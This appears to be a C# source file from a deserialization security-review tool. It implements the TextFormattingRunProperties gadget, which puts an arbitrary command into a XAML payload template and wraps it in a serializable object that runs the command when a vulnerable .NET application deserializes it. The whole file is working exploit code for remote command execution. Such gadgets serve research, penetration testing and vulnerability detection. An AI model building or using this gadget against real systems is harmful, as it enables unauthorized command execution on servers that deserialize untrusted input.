using System;
using System.IO;
using System.Runtime.Serialization;
using Tfrp = Microsoft.VisualStudio.Text.Formatting.TextFormattingRunProperties;

namespace DeReviewer.KnowledgeBase.Gadgets
{
  //  TextFormattingRunProperties Gadget by Oleksandr Mirosh and Alvaro Munoz
  public class TextFormattingRunProperties : IGadget
  {
    public object Build(string command)
    {
      string xamlData = File.ReadAllText(@"Payloads\TextFormattingRunProperties.xaml")
        .Replace("%CMD%", command);

      return new TextFormattingRunPropertiesMarshal(xamlData);
    }
  }

  [Serializable]
  internal class TextFormattingRunPropertiesMarshal : ISerializable
  {
    private readonly string xamlData;

    public TextFormattingRunPropertiesMarshal(string xamlData)
    {
      this.xamlData = xamlData;
    }

    public void GetObjectData(SerializationInfo info, StreamingContext context)
    {
      Type typeTfrp = typeof(Tfrp);
      info.SetType(typeTfrp);
      info.AddValue("ForegroundBrush", xamlData);
    }
  }
}
